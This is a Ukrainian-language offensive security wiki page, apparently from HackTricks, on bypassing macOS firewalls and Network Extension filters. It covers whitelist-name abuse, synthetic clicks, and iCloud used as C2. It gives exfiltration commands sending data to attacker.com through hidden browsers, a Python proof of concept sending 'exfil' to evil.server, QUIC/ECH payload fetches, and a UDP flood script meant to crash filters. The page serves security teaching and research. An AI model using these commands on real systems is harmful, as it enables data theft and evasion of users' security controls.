# Обхід firewall у macOS

{{#include ../../banners/hacktricks-training.md}}

## Виявлені techniques

Наведені нижче techniques працюють у деяких firewall-застосунках macOS.

### Зловживання назвами whitelist

- Наприклад, назвати malware так само, як відомі процеси macOS, наприклад **`launchd`**

### Synthetic Click

- Якщо firewall запитує в користувача дозвіл, змусити malware **натиснути allow**

### **Використання підписаних Apple binaries**

- Наприклад, **`curl`**, а також інших, як-от **`whois`**

### Відомі домени Apple

Firewall може дозволяти з'єднання з відомими доменами Apple, такими як **`apple.com`** або **`icloud.com`**. iCloud можна використовувати як C2.

### Generic Bypass

Кілька ідей для спроби обійти firewall

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе визначити потенційно додані до whitelist домени або застосунки, яким дозволено отримувати до них доступ
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

DNS-розв’язання виконуються через підписаний application **`mdnsreponder`**, якому, ймовірно, буде дозволено підключатися до DNS-серверів.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Через Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Через processes injections

Якщо ви можете **inject code into a process**, якому дозволено підключатися до будь-якого сервера, ви можете обійти захист firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Нещодавні вразливості обходу firewall у macOS (2023-2025)

### Обхід фільтра вебконтенту (Screen Time) – **CVE-2024-44206**
У липні 2024 року Apple випустила patch для критичної помилки в Safari/WebKit, яка ламала загальносистемний “Web content filter”, що використовується батьківським контролем Screen Time.
Спеціально сформований URI (наприклад, із подвійним URL-encoded “://”) не розпізнається ACL Screen Time, але приймається WebKit, тому запит надсилається без фільтрації. Таким чином, будь-який process, який може відкрити URL (зокрема sandboxed або unsigned code), може отримати доступ до доменів, явно заблокованих користувачем або профілем MDM.<sup>[2]</sup>

Практичний тест (у системі без patch):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Помилка порядку правил Packet Filter (PF) у ранніх версіях macOS 14 “Sonoma”
Під час beta-циклу macOS 14 Apple внесла регресію в userspace-обгортку навколо **`pfctl`**.  
Правила, додані з ключовим словом `quick` (яке використовують багато VPN kill-switch), мовчки ігнорувалися, спричиняючи витоки трафіку, навіть коли VPN/firewall GUI повідомляв про *блокування*. Помилку підтвердили кілька VPN-вендорів, і її було виправлено в RC 2 (build 23A344).

Швидка перевірка leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Зловживання helper services, підписаними Apple (legacy – до macOS 11.2)
До macOS 11.2 **`ContentFilterExclusionList`** дозволяв приблизно 50 бінарним файлам Apple, таким як **`nsurlsessiond`** і App Store, обходити всі socket-filter firewalls, реалізовані за допомогою Network Extension framework (LuLu, Little Snitch тощо).
Malware міг просто spawn-ити виключений процес — або inject-ити в нього code — і тунелювати власний traffic через уже дозволений socket. Apple повністю видалила exclusion list у macOS 11.2, але ця техніка все ще актуальна в системах, які неможливо оновити.<sup>[3]</sup>

Приклад proof-of-concept (до 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH для обходу domain filters Network Extension (macOS 12+)
NEFilter Packet/Data Providers орієнтуються на SNI/ALPN у TLS ClientHello. За використання **HTTP/3 over QUIC (UDP/443)** та **Encrypted Client Hello (ECH)** SNI залишається зашифрованим, NetExt не може розібрати flow, а правила для hostname часто працюють у режимі fail-open, дозволяючи malware підключатися до blocked domains без звернення до DNS.<sup>[5]</sup>

Мінімальний PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Якщо QUIC/ECH усе ще увімкнено, це простий шлях обходу фільтрації за hostname.

### Нестабільність Network Extension у macOS 15 “Sequoia” (2024–2025)
Ранні збірки 15.0/15.1 призводять до аварійного завершення роботи сторонніх фільтрів **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne тощо). Коли фільтр перезапускається, macOS видаляє його правила потоків, а багато продуктів переходять у режим fail-open. Надсилання фільтру тисяч коротких UDP-потоків (або примусове використання QUIC/ECH) може неодноразово спричинити збій і залишити вікно для C2/exfil, хоча GUI усе ще показує, що firewall працює.<sup>[4]</sup>

Швидке відтворення (безпечна лабораторна машина):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Поради щодо інструментів для сучасної macOS

1. Перевірте поточні правила PF, які генерують GUI-файрволи:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Перелічіть бінарні файли, які вже мають entitlement *outgoing-network* (корисно для piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Програмно зареєструйте власний фільтр вмісту Network Extension мовами Objective-C/Swift.
Мінімальний rootless PoC, який перенаправляє пакети до локального сокета, доступний у вихідному коді **LuLu** від Patrick Wardle.

## Посилання

- [1] [DEF CON 26 - Patrick Wardle - Вогонь і лід: створення та злам macOS-файрволів](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Обхід фільтра веб-вмісту Apple забезпечує необмежений доступ до заблокованого вмісту (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple вилучила функцію macOS, яка дозволяла застосункам обходити захист файрвола - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Продукти кібербезпеки перестають працювати після оновлення macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Використовуйте захист мережі, щоб запобігати підключенням macOS до небезпечних сайтів - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
